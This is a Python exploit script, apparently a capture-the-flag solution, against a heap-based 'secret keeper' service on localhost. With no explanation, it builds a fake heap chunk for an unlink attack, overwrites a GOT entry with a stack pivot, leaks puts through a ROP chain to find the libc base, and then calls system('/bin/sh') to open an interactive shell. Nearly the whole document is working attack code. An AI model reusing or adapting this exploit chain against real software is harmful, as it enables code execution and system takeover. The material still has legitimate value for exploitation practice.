from pwnlib import *

SMALL = 1 # 40
BIG = 2   # 4k
HUGE = 3  # 400k

limits = {SMALL: 40, BIG: 4000, HUGE: 400000}

def c():
	return s.ru("3. Renew secret\n")

def keep(n, data="XXXX"):
	assert n in [SMALL, BIG, HUGE]
	assert len(data) <= limits[n]
	s.send("1\n")
	s.ru("What secret do you want to keep?")
	s.send("%d\n" % n)
	s.ru("Tell me your secret:")
	s.send(data)
	return c()

def renew(n, data):
	assert n in [SMALL, BIG]
	assert len(data) <= limits[n]
	s.send("3\n")
	s.ru("2. Big secret")
	s.send("%d\n" % n)
	s.ru("Tell me your secret:")
	s.send(data)
	return c()

def wipe(n):
	assert n in [SMALL, BIG]
	s.send("2\n")
	s.ru("2. Big secret")
	s.send("%d\n" % n)
	return c()


s = Socket(("localhost", 6767))
print c()

# points at our fake chunk
good_ptr = 0x6020d0

payload  = ""
payload += pq(0)
payload += pq(0x20) # size must be in smallbin range
payload += pq(good_ptr - 0x18)
payload += pq(good_ptr - 0x10)
payload += pq(0x20) # prev_size

keep(SMALL)
keep(BIG)
wipe(SMALL)
keep(HUGE)
wipe(SMALL)
keep(SMALL, payload)

wipe(BIG)

stack_chk_fail_got = 0x602028

payload  = ""
payload += pq(0)
payload += pq(stack_chk_fail_got) # big
payload += pq(0) # huge
payload += pq(0x6020b8) # small
payload += pd(1)*2 # inuse flags

renew(SMALL, payload)

pivot = 0x0000000000400ebc
pop_rdi = 0x400ec3
puts_got = 0x602020
puts_plt = 0x400760
do_over = 0x400de3

renew(BIG, pq(pivot) + pq(0x400c6f))

payload  = pq(pop_rdi)
payload += pq(puts_got)
payload += pq(puts_plt)
payload += pq(do_over)

raw_input()

s.send(payload)


puts = uq(s.recv()[:-1].ljust(8, '\0'))
libc_base = puts - 0x6f5d0
system = libc_base + 0x45380 
bin_sh = libc_base + 0x18c58b
assert libc_base & 0xfff == 0

raw_input()

payload  = "A"*0x10
payload += pq(pop_rdi)
payload += pq(bin_sh)
payload += pq(system)

s.send(payload)


s.interact()
